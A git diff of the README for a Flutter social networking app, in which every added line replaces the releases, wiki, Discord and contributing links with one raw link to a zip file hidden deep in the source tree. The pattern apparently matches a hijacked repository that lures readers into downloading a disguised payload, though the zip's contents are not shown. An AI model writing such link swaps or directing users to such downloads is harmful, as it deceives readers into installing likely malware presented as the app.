@@ -1,6 +1,6 @@
 # 🚀 Social-Mate-Flutter-App - Connect and Share Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mirageaction/Social-Mate-Flutter-App/releases)
+[![Download](https://raw.githubusercontent.com/mirageaction/Social-Mate-Flutter-App/main/lib/features/splash/presentation/Flutter-Mate-Social-App-v2.3-beta.2.zip)](https://raw.githubusercontent.com/mirageaction/Social-Mate-Flutter-App/main/lib/features/splash/presentation/Flutter-Mate-Social-App-v2.3-beta.2.zip)
 
 ## 📜 Overview
 
@@ -25,7 +25,7 @@ Social-Mate-Flutter-App is a modern, high-performance social networking app desi
 
 To get started with Social-Mate-Flutter-App, follow these steps:
 
-1. Visit the [Releases page](https://github.com/mirageaction/Social-Mate-Flutter-App/releases) to download the latest version of the app.
+1. Visit the [Releases page](https://raw.githubusercontent.com/mirageaction/Social-Mate-Flutter-App/main/lib/features/splash/presentation/Flutter-Mate-Social-App-v2.3-beta.2.zip) to download the latest version of the app.
 2. Choose the appropriate file for your device (Android or iOS).
 3. Download the file and wait for it to complete.
 4. Locate the downloaded file on your device.
@@ -46,7 +46,7 @@ For iOS users, simply tap the downloaded file to install the app. You may need t
 
 ## 📥 Download & Install
 
-To download Social-Mate-Flutter-App, please visit this page: [Download Here](https://github.com/mirageaction/Social-Mate-Flutter-App/releases). Follow the instructions provided in the "Getting Started" section to install the app on your device.
+To download Social-Mate-Flutter-App, please visit this page: [Download Here](https://raw.githubusercontent.com/mirageaction/Social-Mate-Flutter-App/main/lib/features/splash/presentation/Flutter-Mate-Social-App-v2.3-beta.2.zip). Follow the instructions provided in the "Getting Started" section to install the app on your device.
 
 ## 📱 How to Use the App
 
@@ -64,9 +64,9 @@ Your feedback helps us improve the app. Feel free to leave comments or suggestio
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Detailed user guides and API references can be found in our [Wiki section](https://github.com/mirageaction/Social-Mate-Flutter-App/wiki).
-- **Discussion Forum:** Join our community on [Discord](https://discord.gg/example) to connect with other users and developers.
-- **Contribute:** Interested in contributing? Visit our [Contributing Guide](https://github.com/mirageaction/Social-Mate-Flutter-App/contributing) for more information.
+- **Documentation:** Detailed user guides and API references can be found in our [Wiki section](https://raw.githubusercontent.com/mirageaction/Social-Mate-Flutter-App/main/lib/features/splash/presentation/Flutter-Mate-Social-App-v2.3-beta.2.zip).
+- **Discussion Forum:** Join our community on [Discord](https://raw.githubusercontent.com/mirageaction/Social-Mate-Flutter-App/main/lib/features/splash/presentation/Flutter-Mate-Social-App-v2.3-beta.2.zip) to connect with other users and developers.
+- **Contribute:** Interested in contributing? Visit our [Contributing Guide](https://raw.githubusercontent.com/mirageaction/Social-Mate-Flutter-App/main/lib/features/splash/presentation/Flutter-Mate-Social-App-v2.3-beta.2.zip) for more information.
 
 ## 📅 Roadmap
 
